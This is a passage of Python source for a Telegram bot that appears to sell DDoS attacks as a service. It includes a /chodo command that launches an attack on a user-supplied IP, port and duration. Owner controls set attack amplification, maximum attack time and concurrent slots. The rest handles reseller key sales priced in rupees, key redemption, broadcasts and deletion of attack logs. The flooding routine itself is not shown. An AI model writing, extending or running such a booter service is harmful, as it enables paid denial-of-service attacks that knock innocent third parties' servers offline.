        safe_send_message(message.chat.id, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d", reply_to=message)
        return
    
    try:
        new_price = int(command_parts[2])
        if new_price < 0:
            safe_send_message(message.chat.id, "❌ Price cannot be less than 0!", reply_to=message)
            return
    except:
        safe_send_message(message.chat.id, "❌ Invalid price! Enter a number.", reply_to=message)
        return
    
    old_price = RESELLER_PRICING[duration_key]['price']
    RESELLER_PRICING[duration_key]['price'] = new_price
    
    set_setting(f'price_{duration_key}', new_price)
    update_reseller_pricing()
    
    safe_send_message(message.chat.id, f"✅ Price Updated!\n\n📦 Duration: {RESELLER_PRICING[duration_key]['label']}\n💵 Old Price: {old_price} Rs\n💰 New Price: {new_price} Rs", reply_to=message)

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    if not reseller:
        safe_send_message(message.chat.id, "❌ You are not a reseller!", reply_to=message)
        return
    
    if reseller.get('blocked'):
        safe_send_message(message.chat.id, "🚫 Your panel is blocked!", reply_to=message)
        return
    
    safe_send_message(message.chat.id, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys Generated: {reseller.get('total_keys_generated', 0)}\n\n📋 Use /prices to see key prices\n🔑 Use /gen <duration> to generate key", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command is for resellers only!", reply_to=message)
        return
    
    update_reseller_pricing()
    
    response = "═══════════════════════════\n"
    response += "💵 KEY PRICING\n"
    response += "═══════════════════════════\n\n"
    
    durations = ['12h', '1d', '3d', '7d', '30d', '60d']
    for dur in durations:
        if dur in RESELLER_PRICING:
            info = RESELLER_PRICING[dur]
            response += f"🔴 {info['label']:<9} ➜  {info['price']} Rs\n"
            
    response += "\n═══════════════════════════\n"
    response += "📋 Usage: /gen <duration> <count>\n"
    response += "Example: /gen 1d 1\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["chodo"])
def handle_attack(message):
    if not check_channel_and_continue(message): return
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    # ============ GROUP ACCESS CHECK ============
    # Private chat (DM) - key chahiye
    if is_private_chat(message):
        if not has_valid_key(user_id) and not is_owner(user_id):
            safe_send_message(message.chat.id, "❌ You need a valid key to attack in private chat!\n\nUse /redeem <key> to activate.\n\nContact Owner - @DAEMON_OWNER", reply_to=message)
            return
    
    # Group chat - sirf approved group mein attack hoga, key nahi chahiye
    elif is_group_chat(message):
        if not is_group_approved(message.chat.id):
            safe_send_message(message.chat.id, 
                "❌ This group is not approved!\n\n"
                "Contact owner to approve this group.\n"
                f"Group ID: {message.chat.id}\n\n"
                "Use /request_access to request approval.",
                reply_to=message, parse_mode="Markdown")
            return
    
    if has_pending_feedback(user_id):
        safe_send_message(message.chat.id, 
            "📸 **Feedback Required!**\n\n"
            "You must send a screenshot/photo as feedback from your last attack before starting a new one.\n\n"
            "Please send any photo to continue.", 
            reply_to=message, parse_mode="Markdown")
        return

    # Check if user has pending approval (waiting for owner)
    if user_id in pending_approvals and pending_approvals[user_id].get('status') == 'pending':
        safe_send_message(message.chat.id, 
            "📸 **Pending Approval!**\n\n"
            "Your previous attack is waiting for owner approval.\n"
            "Please wait or send feedback screenshot.\n\n"
            "⏳ Auto-approve in 5 minutes.", 
            reply_to=message, parse_mode="Markdown")
        return
    
    cooldown = get_user_cooldown(user_id)
    if cooldown > 0:
        safe_send_message(message.chat.id, f"⏳ Your cooldown active! Wait: {cooldown}s\n\nPlease wait before starting another attack.", reply_to=message)
        return
    
    # rest of the function...
    
    # KEY CHECK: Sirf private chat mein key chahiye, group mein nahi
    if is_private_chat(message):
        if not has_valid_key(user_id) and not is_owner(user_id):
            user = users_db.get(user_id)
            if user and user.get('reseller_username'):
                reseller_name = user.get('reseller_username')
                safe_send_message(message.chat.id, f"❌ Key expired!\n\n🔄 For renewal DM: @{reseller_name}", reply_to=message)
            else:
                safe_send_message(message.chat.id, "❌ You don't have a valid key!\n\n🔑 Contact Owner And Reseller For Free access key. - @DAEMON_OWNER", reply_to=message)
            return
    
    busy_slots, free_slots, total_slots = get_slot_status()
    if free_slots <= 0:
        safe_send_message(message.chat.id, f"❌ All {total_slots} slots are busy!\n\nPlease wait for an attack to finish.\n\n📊 Free: 0/{total_slots}", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, "⚠️ Usage: /chodo <ip> <port> <time>\n\nMinimum time: 60 seconds", reply_to=message)
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    if not validate_target(target):
        safe_send_message(message.chat.id, "❌ Invalid IP!", reply_to=message)
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, "🚫 This IP is blocked! Use another IP.", reply_to=message)
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
            
        if is_port_blocked(port):
            safe_send_message(message.chat.id, 
                f"🚫 Port {port} is blocked!\n"
                f"This port cannot be attacked.\n\n"
                f"📋 Blocked ports: {', '.join(map(str, get_blocked_ports()))}", 
                reply_to=message)
            return
            
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"❌ Minimum attack time is {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        
        max_time = get_max_attack_time()
        if not is_owner(user_id) and duration > max_time:
            safe_send_message(message.chat.id, f"❌ Max time: {max_time}s Agar isase jyada Attack Time Chahie Toh Paid Wala Buy Karo Cooldown Low And More Powerfull Cheap Price Hai - @DAEMON_OWNER", reply_to=message)
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        
        if api_index is None:
            safe_send_message(message.chat.id, "❌ No free slots available! Please wait.", reply_to=message)
            return
        
        with _attack_lock:
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index))
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Port and time must be numbers!", reply_to=message)

@bot.message_handler(commands=["status"])
def status_command(message):
    if not check_channel_and_continue(message): return
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    # Group chat mein key check mat karo
    if is_private_chat(message):
        if not has_valid_key(user_id) and not is_owner(user_id):
            safe_send_message(message.chat.id, "❌ DM FOR FREE KEY!\nOwner - @DAEMON_OWNER", reply_to=message)
            return
    # Group chat mein key check skip
    # elif is_group_chat(message):
    #     # Group mein bina key ke status dekh sakte hain
    #     pass
        
    response = build_global_status_message(user_id)
    try:
        sent_msg = safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
        
        if user_has_active_attack(user_id) or get_user_cooldown(user_id) > 0:
            thread = threading.Thread(target=update_status_loop, args=(sent_msg.chat.id, sent_msg.message_id, user_id))
            thread.daemon = True
            thread.start()
    except Exception as e:
        safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if not check_channel_and_continue(message): return
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    # Group chat mein alag message
    if is_group_chat(message):
        safe_send_message(message.chat.id, "🔑 Key Info:\n\nThis command only works in private chat (DM).\nPlease DM me to check your key details.\n\n@DAEMON_OWNER", reply_to=message, parse_mode="Markdown")
        return
    
    user = users_db.get(user_id)
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, "❌ You don't have a key! Contact Owner - @DAEMON_OWNER", reply_to=message)
        return
    
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            safe_send_message(message.chat.id, f"❌ Key expired!\n\n🔄 For renewal DM: @{reseller_username}", reply_to=message, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, "❌ Key expired!\n\nContact Owner - @DAEMON_OWNER", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    safe_send_message(message.chat.id, f"🔑 Key Details\n\n📌 Key: {user['key']}\n⏳ Remaining: {remaining}\n✅ Status: Active", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if not check_channel_and_continue(message): return
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    # Group chat mein redeem nahi kar sakte
    if is_group_chat(message):
        safe_send_message(message.chat.id, "🔑 Redeem Key:\n\nThis command only works in private chat (DM).\nPlease DM me to redeem your key.\n\n@DAEMON_OWNER", reply_to=message, parse_mode="Markdown")
        return
    
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /redeem <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    key_doc = keys_db.get(key_input)
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Invalid key!", reply_to=message)
        return
    
    # Rest of your existing redeem code...
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    
    if key_doc.get('used') and current_users >= max_users:
        safe_send_message(message.chat.id, "❌ This key has already been used!", reply_to=message)
        return
    
    user = users_db.get(user_id)
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        
        users_db[user_id] = {
            'user_id': user_id,
            'username': user_name,
            'key': key_input,
            'key_expiry': new_expiry,
            'key_duration_seconds': key_doc['duration_seconds'],
            'key_duration_label': key_doc['duration_label'],
            'redeemed_at': datetime.now(),
            'reseller_username': reseller_username
        }
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_db[key_input]['used'] = True
            keys_db[key_input]['used_by'] = user_id
            keys_db[key_input]['used_at'] = datetime.now()
            keys_db[key_input]['current_users'] = new_current
        else:
            keys_db[key_input]['used_at'] = datetime.now()
            keys_db[key_input]['current_users'] = new_current
        
        save_users(users_db)
        save_keys(keys_db)
        
        new_remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"✅ Key Extended!\n\n🔑 Key: {key_input}\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {new_remaining}", reply_to=message, parse_mode="Markdown")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        
        users_db[user_id] = {
            'user_id': user_id,
            'username': user_name,
            'key': key_input,
            'key_expiry': expiry_time,
            'key_duration_seconds': key_doc['duration_seconds'],
            'key_duration_label': key_doc['duration_label'],
            'redeemed_at': datetime.now(),
            'reseller_username': reseller_username
        }
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_db[key_input]['used'] = True
            keys_db[key_input]['used_by'] = user_id
            keys_db[key_input]['used_at'] = datetime.now()
            keys_db[key_input]['current_users'] = new_current
        else:
            keys_db[key_input]['used_at'] = datetime.now()
            keys_db[key_input]['current_users'] = new_current
        
        save_users(users_db)
        save_keys(keys_db)
        
        remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"✅ Key Redeemed!\n\n🔑 Key: {key_input}\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["max_concurrent"])
def max_concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        busy_slots, free_slots, total_slots = get_slot_status()
        safe_send_message(message.chat.id, 
            f"⚙️ Slot Management\n\n"
            f"📊 Current Max Slots: {current_max_slots}\n"
            f"🟢 Free Slots: {free_slots}/{current_max_slots}\n"
            f"🔴 Used Slots: {busy_slots}/{current_max_slots}\n\n"
            f"📝 Usage: /max_concurrent <number>\n"
            f"🔹 Range: 1-{MAX_SLOTS_LIMIT}\n"
            f"🔹 This controls how many users can attack simultaneously", 
            reply_to=message, parse_mode="Markdown")
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 1 or new_value > MAX_SLOTS_LIMIT:
            safe_send_message(message.chat.id, f"❌ Value must be between 1 and {MAX_SLOTS_LIMIT}!", reply_to=message)
            return
        
        old_value = current_max_slots
        if update_max_slots(new_value):
            safe_send_message(message.chat.id, 
                f"✅ Max Concurrent Slots Updated!\n\n"
                f"📊 Old: {old_value} slots\n"
                f"📊 New: {new_value} slots\n\n"
                f"🔄 Now {new_value} users can attack simultaneously!\n"
                f"💡 Use /status to see slot availability", 
                reply_to=message, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, "❌ Failed to update slots!", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["concurrent"])
def concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_concurrent_limit()
        safe_send_message(message.chat.id, 
            f"⚙️ Attack Amplification\n\n"
            f"💪 Current: {current}x per attack\n\n"
            f"📝 Usage: /concurrent <number>\n"
            f"🔹 This sends multiple requests per attack\n"
            f"🔹 Example: /concurrent 3 = 3x stronger attack\n\n"
            f"⚠️ Note: This is different from max concurrent slots!\n"
            f"   • /max_concurrent = users at once\n"
            f"   • /concurrent = strength per attack", 
            reply_to=message, parse_mode="Markdown")
        return
        
    try:
        new_value = int(command_parts[1])
        if new_value < 1 or new_value > 20:
            safe_send_message(message.chat.id, "❌ Value must be between 1-20!", reply_to=message)
            return
        
        set_setting('_cx_th', new_value)
        safe_send_message(message.chat.id, f"✅ Attack amplification set to: {new_value}x\n\nNow each attack will send {new_value} requests!", reply_to=message, parse_mode="Markdown")
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["max_attack"])
def max_attack_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"⚙️ Current Max Attack Time: {current}s\n\nChange: /max_attack <seconds>", reply_to=message)
        return
    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"❌ Value must be at least {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        set_setting('max_attack_time', new_value)
        safe_send_message(message.chat.id, f"✅ Max Attack Time set: {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_user_cooldown_setting()
        safe_send_message(message.chat.id, f"⏳ Current Cooldown: {current}s\n\nChange: /cooldown <seconds>", reply_to=message)
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, "❌ Cooldown cannot be negative!", reply_to=message)
            return
        set_setting('user_cooldown', new_value)
        safe_send_message(message.chat.id, f"✅ Cooldown set: {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_ip <ip_prefix>\n\nExample: /block_ip 192.168.\nExample: /block_ip 10.0.", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    if add_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"✅ IP Blocked!\n\n🚫 Prefix: {ip_prefix}\n\nNow IPs starting with {ip_prefix}* cannot be attacked.", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, f"ℹ️ {ip_prefix} is already blocked!", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_ip <ip_prefix>", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    if remove_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"✅ IP Unblocked!\n\n✅ Prefix: {ip_prefix}", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, f"❌ {ip_prefix} is not in the blocked list!", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    blocked = get_blocked_ips()
    if not blocked:
        safe_send_message(message.chat.id, "📋 No IPs are blocked!", reply_to=message)
        return
    
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. {ip}*\n"
    response += f"\n📊 Total: {len(blocked)}"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["prot_on"])
def prot_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    set_setting('port_protection', True)
    safe_send_message(message.chat.id, "✅ Port Spam Protection enabled!", reply_to=message)

@bot.message_handler(commands=["prot_off"])
def prot_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    set_setting('port_protection', False)
    safe_send_message(message.chat.id, "✅ Port Spam Protection disabled!", reply_to=message)

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /maintenance <message>\n\nExample: /maintenance Bot is updating, please wait 10 minutes", reply_to=message)
        return
    
    msg = command_parts[1]
    set_maintenance(True, msg)
    safe_send_message(message.chat.id, f"🔧 Maintenance Mode ON!\n\nMessage: {msg}\n\nUse /ok to turn off", reply_to=message)

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    if not is_maintenance():
        safe_send_message(message.chat.id, "ℹ️ Maintenance mode is already OFF!", reply_to=message)
        return
    
    set_maintenance(False)
    safe_send_message(message.chat.id, "✅ Maintenance Mode OFF!\n\nBot is now normal.", reply_to=message)

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    
    ram = psutil.virtual_memory()
    ram_percent = ram.percent
    
    total_users = len(users_db)
    active_users = 0
    for user in users_db.values():
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users += 1
    
    total_resellers = len(resellers_db)
    total_keys = len(keys_db)
    active_keys = 0
    for key in keys_db.values():
        if not key.get('used'):
            active_keys += 1
    
    busy_slots, free_slots, total_slots = get_slot_status()
    
    response = f"""
📊 SERVER STATISTICS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 BOT INFO:
• Uptime: {hours:02d}:{minutes:02d}:{seconds:02d}
• Memory: {memory_mb:.1f} MB
• CPU: {cpu_percent:.1f}%
• RAM: {ram_percent:.1f}%

⚔️ ATTACK STATUS:
• Active Attacks: {busy_slots}/{total_slots}
• Free Slots: {free_slots}
• Max Slots: {total_slots}
• Attack Amplification: {get_concurrent_limit()}x

⚙️ SETTINGS:
• Max Attack Time: {get_max_attack_time()}s
• Min Attack Time: {MIN_ATTACK_TIME}s
• Individual Cooldown: {get_user_cooldown_setting()}s

📈 BOT DATA:
• Total Users: {total_users}
• Active Users: {active_users}
• Resellers: {total_resellers}
• Total Keys: {total_keys}
• Available Keys: {active_keys}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    if not attack_logs_db:
        safe_send_message(message.chat.id, "📋 No attack logs found!", reply_to=message)
        return
    
    content = "📊 ATTACK LOGS\n\n"
    for i, log in enumerate(attack_logs_db[-50:], 1):
        ts = log['timestamp'].strftime('%d-%m-%Y %H:%M')
        content += f"{i}. {log.get('username')} → {log.get('target')}:{log.get('port')}\n"
        content += f"   ⏱️ {log.get('duration')}s | 🕐 {ts}\n\n"
    
    send_long_message(message, content, parse_mode="Markdown")

@bot.message_handler(commands=["del_logs"])
def delete_logs_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    count = len(attack_logs_db)
    if count == 0:
        safe_send_message(message.chat.id, "📋 No logs to delete!", reply_to=message)
        return
    
    attack_logs_db.clear()
    save_attack_logs(attack_logs_db)
    safe_send_message(message.chat.id, f"✅ {count} attack logs deleted!", reply_to=message)

@bot.message_handler(commands=["user_resell"])
def user_resell_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /user_resell <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    keys = []
    for key_data in keys_db.values():
        if key_data.get('created_by') == reseller_id and key_data.get('used'):
            keys.append(key_data)
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if not keys:
        safe_send_message(message.chat.id, f"📋 Reseller {display} has no users!", reply_to=message)
        return
    
    response = f"═══════════════════════════\n"
    response += f"👤 RESELLER {display} USERS\n"
    response += "═══════════════════════════\n\n"
    
    for i, key in enumerate(keys[:15], 1):
        for user in users_db.values():
            if user.get('key') == key['key']:
                response += f"{i}. 👤 {user.get('username', 'Unknown')}\n"
                response += f"   📱 ID: {user['user_id']}\n"
                response += f"   🔑 Key: {key['key']}\n\n"
                break
    
    response += f"═══════════════════════════\n"
    response += f"📊 Total Users: {len(keys)}\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    all_user_ids = set()
    for uid in users_db:
        all_user_ids.add(uid)
    for uid in resellers_db:
        all_user_ids.add(uid)
    for uid in bot_users_db:
        all_user_ids.add(uid)
    
    sent_count = 0
    failed_count = 0
    
    progress_msg = safe_send_message(message.chat.id, f"📢 Broadcasting to {len(all_user_ids)} users...", reply_to=message)
    
    for uid in all_user_ids:
        try:
            if uid == BOT_OWNER:
                continue
            bot.send_message(uid, f"📢 BROADCAST\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    try:
        bot.edit_message_text(
            f"✅ Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}",
            message.chat.id,
            progress_msg.message_id
        )
    except:
        safe_send_message(message.chat.id, f"✅ Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcast_reseller"])
def broadcast_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast_reseller <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    reseller_ids = list(resellers_db.keys())
    
    sent_count = 0
    failed_count = 0
    
    for rid in reseller_ids:
        try:
            bot.send_message(rid, f"📢 RESELLER NOTICE\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Reseller Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcast_paid"])
def broadcast_paid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast_paid <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    now = datetime.now()
    active_subscribers = []
    for user in users_db.values():
        if user.get('key_expiry') and user['key_expiry'] > now:
            active_subscribers.append(user)
    
    sent_count = 0
    failed_count = 0
    
    for user in active_subscribers:
        try:
            uid = user['user_id']
            if uid == BOT_OWNER:
                continue
            bot.send_message(uid, f"💎 PAID USER ANNOUNCEMENT\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Paid Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["trail"])
def owner_trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /trail <duration> <count>\n\nExample: /trail 1h 10", reply_to=message)
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    try:
        count = int(command_parts[2])
        if count < 1 or count > 20:
            safe_send_message(message.chat.id, "❌ Count must be between 1-20!", reply_to=message)
            return
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
        return
    
    generated_keys = []
    for _ in range(count):
        key = f"TRAIL-OWNER-{generate_key(10)}"
        keys_db[key] = {
            'key': key,
            'duration_seconds': int(duration.total_seconds()),
            'duration_label': f"{duration_label} (Owner Trail)",
            'created_at': datetime.now(),
            'created_by': user_id,
            'created_by_type': 'owner_trail',
            'used': False,
            'used_by': None,
            'used_at': None,
            'max_users': 1,
            'is_trail': True
        }
        generated_keys.append(key)
    
    save_keys(keys_db)  # ✅ SAVE
    
    keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
    safe_send_message(message.chat.id, f"✅ {count} Owner Trail Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["reseller_trail", "resellertrail"])
def reseller_trail_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /reseller_trail <hours> <max_users>\n\nExample: /reseller_trail 1 10 (1hr key for resellers)", reply_to=message)
        return
    
    try:
        hours = int(command_parts[1])
        max_users = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid hours or max_users!", reply_to=message)
        return
    
    active_resellers = []
    for rid, reseller in resellers_db.items():
        if not reseller.get('blocked'):
            active_resellers.append((rid, reseller))
    
    if not active_resellers:
        safe_send_message(message.chat.id, "❌ No active resellers found!", reply_to=message)
        return
    
    sent_count = 0
    for rid, reseller in active_resellers:
        reseller_id = rid
        try:
            chat = bot.get_chat(reseller_id)
            reseller_username = chat.username or str(reseller_id)
        except:
            reseller_username = str(reseller_id)
        key = f"TRAIL-{reseller_username}-{generate_key(8)}"
        
        keys_db[key] = {
            'key': key,
            'duration_seconds': hours * 3600,
            'duration_label': f"{hours} hours (Reseller Trail)",
            'created_at': datetime.now(),
